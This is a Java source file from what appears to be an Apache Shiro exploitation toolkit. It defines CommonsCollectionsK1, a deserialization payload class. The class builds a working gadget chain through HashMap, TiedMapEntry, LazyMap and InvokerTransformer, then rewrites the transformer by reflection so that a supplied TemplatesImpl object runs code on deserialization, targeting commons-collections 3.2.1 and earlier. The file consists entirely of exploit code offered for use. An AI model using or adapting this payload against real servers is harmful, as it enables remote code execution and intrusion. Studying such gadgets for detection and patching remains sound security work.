package fun.fireline.exp.apache.shiro.deser.payloads;

import fun.fireline.exp.apache.shiro.deser.payloads.annotation.Authors;
import fun.fireline.exp.apache.shiro.deser.payloads.annotation.Dependencies;
import fun.fireline.exp.apache.shiro.deser.util.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


import java.util.HashMap;
import java.util.Map;

/*
Gadget chain:
     HashMap
       TiedMapEntry.hashCode
         TiedMapEntry.getValue
           LazyMap.decorate
             InvokerTransformer
               templates...
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({Authors.KORLR})
public class CommonsCollectionsK1 implements ObjectPayload<Map> {

    @Override
    public Map getObject(final Object tpl) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.decorate(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }
}